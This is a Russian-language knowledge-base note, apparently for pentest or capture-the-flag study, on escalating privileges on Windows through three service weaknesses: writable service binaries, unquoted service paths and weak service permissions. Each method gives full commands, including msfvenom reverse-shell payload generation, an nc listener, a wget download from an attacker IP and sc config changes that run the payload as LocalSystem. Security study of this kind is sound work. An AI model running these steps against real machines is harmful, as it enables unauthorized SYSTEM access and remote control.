---
title: "Повышение привилегий на Widows машинах  эксплуатации уязвимостей Windows Services"
id: note-44
created: "03.02.2026 13:34"
category: "07_Windows и Active Directory"
tags:
  - иб/windows
  - ad
---

> [!info] Навигация
> [[🏠 Главная — База знаний ИБ|🏠 Главная]] · Категория: `07_Windows и Active Directory` · Дата: `03.02.2026 13:34`

# Повышение привилегий на Widows машинах  эксплуатации уязвимостей Windows Services

Быстрая навигация 
Уязвимость|Команда проверки|Основная идея|Целевая учётка
Слабые права на файл || icacls путь_к_файлу||Замена исполняемого файла|Учётка службы
Незакавыченный путь||sc qc "имя_службы"||Создание файла раньше в пути|| Учётка службы
Слабые права на службу||accesschk.exe -qlc имя_службы||Изменение настроек службы|| /LocalSystem

Общая информация
Основные команды
Просмотр конфигурации службы
sc qc "Имя службы"
sc.exe query "Имя службы"  # В PowerShell используй sc.exe

Управление службой
sc start "Имя службы"
sc stop "Имя службы"
sc config "Имя службы" параметр= значение

Проверка прав на файл
icacls "путь_к_файлу"

Где искать информацию
Конфигурация службы: BINARY_PATH_NAME (путь к файлу), SERVICE_START_NAME (учётка)
Права на файлы: Группа Everyone с правами (M) или (F)
Реестр: HKLM\SYSTEM\CurrentControlSet\Services\Имя_службы
ImagePath - путь к исполняемому файлу
ObjectName - учётная запись службы

Уязвимость: Слабые права на файл службы
Суть атаки
Если у Everyone есть права на изменение (M) исполняемого файла службы → заменяем его своим payload.
Пошаговый план
Шаг 1: Ищем уязвимую службу
Смотрим конфигурацию
sc qc ИмяСлужбы

Проверяем права на файл
icacls "C:\путь\к\службе.exe"
Ищем: Everyone:(I)(M) или другие слабые права.
Шаг 2: Готовим payload (на Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ВАШ_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server 8000
nc -lvp 4445
Шаг 3: Атакуем
cmd
Загружаем payload
wget http://ВАШ_IP:8000/rev-svc.exe -O rev-svc.exe

Делаем бэкап оригинального файла
move оригинал.exe оригинал.exe.bkp

Заменяем файл
move rev-svc.exe оригинал.exe

Даём права на выполнение
icacls оригинал.exe /grant Everyone:F

Перезапускаем службу
sc stop ИмяСлужбы
sc start ИмяСлужбы
Шаг 4: Получаем shell
На Kali: nc -lvp 4445
Проверяем: whoami → права учётной записи службы

Уязвимость: Незакавыченный путь службы
Суть атаки
Путь без кавычек: C:\Program Files\My Service\server.exe
Windows ищет:
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Service\server.exe

 Пошаговый план
Шаг 1: Ищем службу с незакавыченным путём
sc qc "Имя Службы"
Ищем: BINARY_PATH_NAME без кавычек и с пробелами.
Шаг 2: Проверяем права на директорию
icacls "C:\путь\с\пробелами"
Нужно: Возможность создать файл в этой директории.
Шаг 3: Определяем приоритетный путь
Если путь: C:\My Apps\Service One\bin\service.exe
Windows ищет:
C:\My.exe
C:\My Apps\Service.exe
C:\My Apps\Service One\bin\service.exe
Выбираем самый ранний путь, куда можем записать.
Шаг 4: Готовим payload
На Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ВАШ_IP LPORT=4446 -f exe-service -o rev-svc2.exe
nc -lvp 4446
Шаг 5: Атакуем
Копируем payload в нужное место
move rev-svc2.exe "C:\My Apps\Service.exe"

Даём права
icacls "C:\My Apps\Service.exe" /grant Everyone:F

Перезапускаем службу
sc stop "Имя Службы"
sc start "Имя Службы"

Уязвимость: Слабые права на службу (DACL)
Суть атаки
Если у пользователя есть SERVICE_ALL_ACCESS → можно изменить настройки службы.
Пошаговый план
Шаг 1: Проверяем права доступа к службе
Используем accesschk.exe
accesschk64.exe -qlc ИмяСлужбы
Ищем: BUILTIN\Users с SERVICE_ALL_ACCESS
Шаг 2: Готовим payload
На Kali
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ВАШ_IP LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
Шаг 3: Меняем конфигурацию службы
Загружаем payload
Даём права
icacls rev-svc3.exe /grant Everyone:F

Меняем путь к исполняемому файлу и учётную запись
sc config ИмяСлужбы binPath= "C:\путь\rev-svc3.exe" obj= LocalSystem

 Обратите внимание на пробел после = !
 obj= LocalSystem  (пробел после = обязателен)
Шаг 4: Запускаем и получаем SYSTEM
sc stop ИмяСлужбы
sc start ИмяСлужбы
Результат: Shell с правами NT AUTHORITY\SYSTEM

 Утилиты для проверки
Утилита               |                     Назначение                          |                     Пример
sc                                       Управление службами                                 sc qc wuauserv
icacls                                  Проверка прав NTFS     icacls "C:\Windows\system32\*.exe"
accesschk                      Проверка прав доступа                         accesschk64.exe -qlc *
wmic                                Альтернатива sc                   wmic service get name,pathname
powershell                      Современное управление               Get-Service | Format-List

Чек-лист атаки
Разведка: sc query или wmic service get name,pathname
Анализ: Для каждой службы:
sc qc ИмяСлужбы → смотрим путь и учётку
icacls путь_к_файлу → проверяем права
Если путь без кавычек → проверяем права на папки
accesschk64.exe -qlc ИмяСлужбы → проверяем DACL службы
Выбор вектора: Какая уязвимость применима?
Подготовка: Генерация payload, настройка listener
Эксплуатация: Замена файла / создание файла / изменение конфигурации
Триггер: Перезапуск службы
Пост-эксплуатация: Проверка прав, сбор флагов
